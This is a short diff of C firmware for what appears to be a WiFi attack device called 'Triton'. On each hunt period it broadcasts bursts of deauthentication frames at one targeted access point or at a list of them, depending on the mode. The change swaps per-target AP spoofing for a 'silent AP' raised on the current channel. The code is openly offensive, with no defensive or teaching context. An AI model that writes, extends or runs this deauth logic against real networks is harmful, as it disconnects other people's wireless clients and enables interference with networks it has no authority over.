@@ -354,25 +354,26 @@ static void hop_task(void *)
 
         if (hunt_period > 0 && millis() - last_hunt > hunt_period) {
             last_hunt = millis();
+            /* Triton hops channels via the RL-picked s_ch — only
+             * deauth APs on whatever channel we happen to be on this
+             * iteration. Silent AP comes up on s_ch for the duration. */
+            wifi_silent_ap_begin(s_ch);
             if (s_mode == TM_SURGICAL) {
-                wifi_ap_spoof_begin(s_target_bssid);
                 int bursts = 8;
                 for (int k = 0; k < bursts && s_alive; ++k) {
                     wifi_deauth_broadcast(s_target_bssid, &seq);
                     delay(5);
                 }
-                wifi_ap_spoof_end();
             } else if (s_bs_n > 0) {
                 int bursts = (s_mode == TM_STORM) ? 4 : 2;
                 for (int i = 0; i < s_bs_n && s_alive; ++i) {
-                    wifi_ap_spoof_begin(s_bs[i].bssid);
                     for (int k = 0; k < bursts; ++k) {
                         wifi_deauth_broadcast(s_bs[i].bssid, &seq);
                         delay(5);
                     }
-                    wifi_ap_spoof_end();
                 }
             }
+            wifi_silent_ap_end();
         }
 
         /* Dwell per mode. */
